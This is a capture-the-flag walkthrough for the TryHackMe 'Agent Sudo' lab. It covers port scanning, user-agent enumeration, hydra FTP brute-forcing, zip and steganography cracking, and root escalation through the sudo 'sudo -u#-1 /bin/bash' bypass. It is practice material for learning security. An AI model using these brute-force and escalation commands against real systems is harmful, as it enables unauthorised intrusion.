# Agent Sudo

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

[AgentSudo CTF on THM](https://tryhackme.com/room/agentsudoctf)

### Enumeration

#### Nmap
Scan the target with namp with following flags:   
-sC : use default scripts  
-sV : identify versions  
-T4 : scan timings, as its a CTF we can use 4.  

```nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 21:02 IST
Nmap scan report for 10.10.129.10
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

#### Check the website:
Visit the website on a web-browser. We find the below text on the site:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

We can also check for other links in the webiste with gobuster, but we dont find any links from the small wordlist

#### Burp Suite:
As it says we need to change the ```user-agent``` with codename, we can capture this request in Burp Suite and modify the ```user-agent``` there.

After capturing the request in Burp Suite **Proxy**, send it to **Repeater**. There we can edit the ```user-agent``` to ```R``` (Agent R is written in website)
With this we get the below response:

```
HTTP/1.1 200 OK
Date: Sun, 12 Feb 2023 15:54:45 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 310
Connection: close
Content-Type: text/html; charset=UTF-8

What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

We get a different response, confirming that agents names are single letter alphabets in upper-case. We can now enumerate this will all possible letters with Burp Suite **Intruder**.

After sending it to **Intruder**, add the payload position as User-Agent. Next, in the Payloads tab select payload type as Simple List and load a payload file with all letters in new lines.

We can then start the attack. 

After checking all the responses, we notice that User-Agent ```C``` got a different response:

```
HTTP/1.1 302 Found
Date: Sun, 12 Feb 2023 16:06:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: **agent_C_attention.php**
Content-Length: 218
Connection: close
Content-Type: text/html; charset=UTF-8
```

When we visit [<IP>/agent_C_attention.php](http://10.10.129.10/agent_C_attention.php), we get the below text:
```
Attention **chris**,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
  
**With this we can complete Task 2**:     
How many open ports? : ```3```   
How you redirect yourself to a secret page? : ```user-ag***```   
What is the agent name? : ```chr**```   

  

  
### Hash Cracking and brute-forcing
  
Now that we have a username, we can try brute-forcing passwords for SSH or FTP. As the next question asks for FTP, lets try it out first.

#### Hail Hydra:

WE use hydra for brute-forcing FTP password with username **chris** and passwords from **rockyou** wordlist. (Note: By default rockyou wordlist is located in ```/usr/share/wordlists```)
```
hydra -l chris -P ~/rockyou.txt 10.10.129.10 -v ftp

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-12 21:57:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.129.10:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[21][ftp] host: 10.10.129.10   login: chris   password: crystal
[STATUS] attack finished for 10.10.129.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-12 21:58:17

```

With this we have found the FTP passwor for **chris**. Lets login!

#### FTP login

We login to FTP and find three files: cute-alien.jpg, cutie.png, and To_agentJ.txt. Lets download them all to our local machine.

The text file ```To_agentJ.txt``` has the following:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

It gives us a hint that something is stored in the "fake pictures".


#### Binwalk  
  
  
Lets inspect the pictures with binwalk: 
   
```
binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

It looks like a zip file is hidden in this image. We can extract it with: ```binwalk -e cutie.png```

After extracting we find four files: 365, 365.zlib, 8702.zip, and To_agentR.txt.
  
The zip file is password protected but we can crack it with ```zip2john``` and ```john```.
  
```
zip2john 8702.zip > zip.hash
john zip.hash -show
```
This will give us the password for the zip file: ```8702.zip/To_agentR.txt:alien:To_agentR.txt:8702.zip:8702.zip```

Lets extract the zip with: ```7z e 8702.zip``` and give the password (alien) when prompted.

Now we can see the contents of To_agentR.txt:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```QXJlYTUx``` is a encoded base64 string. After decoding it we get: **Area51**.

Now lets inspect the other image file. Binwalk does not return any details. 
As we have a question with **steg** password, we can infer this has to do with ```steghide```.
Lets run the following:
```steghide extract -sf cute-alien.jpg -p Area51```

With this we find a new file **message.txt**.

In this file we get the password for james (most likely the ssh pass) and real name for Agent J.
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
  
**Now we can answer Task 3**:    
FTP password : ```cryst**```   
Zip file password : ```ali**```   
steg password : ```Area**```   
Who is the other agent (in full name)? : ```jam**```   
SSH password : ```hackerru****```   
  
  
### Capture the user flag:
  
As we have the password for james, lets login via SSH. We can find the user flag in the home directory of user james.

And just like that we completed Task 4. (The other question is just about reverse image searching the image present in james's home dir and not related to this machine)

### Privillage Escalation:

Running ```sudo -l``` gives us a wierd response:
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
This means **james** can't run ```/bin/bash``` as root but can run ```/bin/bash``` as any user. This can be exploited.

Searching for this in google returns a result from [exploit-db](https://www.exploit-db.com/exploits/47502).
We can get the CVE number from here too.
  
Reading the exploit we can get the command to riase our privillage to root: ```sudo -u#-1 /bin/bash```.
  
With this we are now root. The final flag is located inside ```/root/root.txt```.

